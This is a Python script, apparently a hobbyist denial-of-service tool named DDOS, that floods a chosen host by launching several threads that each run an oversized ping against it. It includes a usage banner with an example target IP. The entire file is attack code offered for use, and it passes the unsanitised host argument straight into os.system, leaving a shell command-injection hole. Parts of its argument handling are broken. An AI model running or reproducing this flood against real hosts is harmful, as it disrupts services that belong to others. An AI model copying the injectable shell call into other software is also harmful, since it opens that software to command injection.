#!/usr/bin/python3

import socket
import sys
import os
import threading


class DDOS:
    def __init__(self) -> None:
        if (not self.get_args()):
            raise Exception(f"Incorrect values from {' '.join(sys.argv)}")

        if (len(sys.argv) == 0):
            print("""
__/\\\\\\\\\\\\\\\\\\\\\\__/\\\\\\\\\\\\\\\\\\\\\\\\\\______________/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\__/\\\\\\______________/\\\\\\________/\\\\\\_____/\\\\\\\\\\\\\\\\\\\\\\____/\\\\\\________/\\\\\\_
 _\\/////\\\\\\///__\\/\\\\\\/////////\\\\\\___________\\/\\\\\\///////////__\\/\\\\\\_____________\\/\\\\\\_______\\/\\\\\\___/\\\\\\/////////\\\\\\_\\/\\\\\\_______\\/\\\\\\_
  _____\\/\\\\\\_____\\/\\\\\\_______\\/\\\\\\___________\\/\\\\\\_____________\\/\\\\\\_____________\\/\\\\\\_______\\/\\\\\\__\\//\\\\\\______\\///__\\/\\\\\\_______\\/\\\\\\_
   _____\\/\\\\\\_____\\/\\\\\\\\\\\\\\\\\\\\\\\\\\/____________\\/\\\\\\\\\\\\\\\\\\\\\\_____\\/\\\\\\_____________\\/\\\\\\_______\\/\\\\\\___\\////\\\\\\_________\\/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\_
    _____\\/\\\\\\_____\\/\\\\\\/////////______________\\/\\\\\\///////______\\/\\\\\\_____________\\/\\\\\\_______\\/\\\\\\______\\////\\\\\\______\\/\\\\\\/////////\\\\\\_
     _____\\/\\\\\\_____\\/\\\\\\_______________________\\/\\\\\\_____________\\/\\\\\\_____________\\/\\\\\\_______\\/\\\\\\_________\\////\\\\\\___\\/\\\\\\_______\\/\\\\\\_
      _____\\/\\\\\\_____\\/\\\\\\_______________________\\/\\\\\\_____________\\/\\\\\\_____________\\//\\\\\\______/\\\\\\___/\\\\\\______\\//\\\\\\__\\/\\\\\\_______\\/\\\\\\_
       __/\\\\\\\\\\\\\\\\\\\\\\_\\/\\\\\\_______________________\\/\\\\\\_____________\\/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\__\\///\\\\\\\\\\\\\\\\\\/___\\///\\\\\\\\\\\\\\\\\\\\\\/___\\/\\\\\\_______\\/\\\\\\_
        _\\///////////__\\///________________________\\///______________\\///////////////_____\\/////////_______\\///////////_____\\///________\\///__

            Layout:

            -p <packets>  This is the number packets that you will send
            -mp           This will send the max packets to the host
            -h <host>     This is the host
            -t <threads>  The number of threads being used

            Ex: DDos.py -p 4000 -h 100.202.12.3
            """)
        else:
            tasks = []
            for i in range(int(self.threads)):
                tasks.append(self.run)

            self.run_functions(tasks)


    def get_args(self):
        args = sys.argv
        del args[0]

        is_p = True if ('-p' in args) else False
        p = args[args.index('-p')+1] if is_p else 0

        is_t = True if ('-t' in args) else False
        t = args[args.index('-t')+1] if is_t else 1

        is_mp = True if ('-mp' in args) else False
        p = p if (not is_mp) else 65000

        is_host = True if ('-h' in args) else False
        host = args[args.index('-h')+1] if is_host else ""

        self.packet_size = p
        self.host = host
        self.threads = t

        return True

    def run_functions(self, functions):
        threads = []
        for function in functions:
            thread = threading.Thread(target=function)
            thread.start()
            threads.append(thread)

        for thread in threads:
            thread.join()

    def run(self):
        localhost = socket.gethostbyname(socket.gethostname()) # local IP adress of your computer
        print(f"{localhost}: Listening")

        rep = os.system('ping -s ' + str(self.packet_size) +  ' ' + self.host)


if __name__ == "__main__":
    ddos_obj = DDOS()
